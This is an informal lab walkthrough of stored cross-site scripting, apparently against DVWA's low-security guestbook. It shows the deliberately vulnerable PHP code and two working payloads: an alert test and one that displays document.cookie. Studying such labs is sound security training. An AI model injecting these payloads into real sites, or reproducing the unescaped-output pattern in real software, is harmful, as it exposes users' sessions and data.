xss stored :- 

Get to know xss stored 
xss or cross site scripting is an attack sthat allows the attackerto insert and execute javascript on the victim's website.


low : - 

<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitize name input
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}


"test<'>"        --- stored on the page


from the informaiton we can get from the view page source, we can see that is no validation for 
special html characters here, so we can easliy perform xss attacks.

</div>
<br />

<div id="guessbook_comments">Name: Ap<br />Message: test<'></br /></div>
<br />



perform attacks : 
we can try first payload namely:

<script>alert('Hacked')</script>


now it is worked now you will see the view page source  again :
<div id=guessbook_comments">NAme: Ap<br />Message: <script>alert('Hacked')</script><br /></div>

now get cookies:
<script>alert(document.cookie)</script>


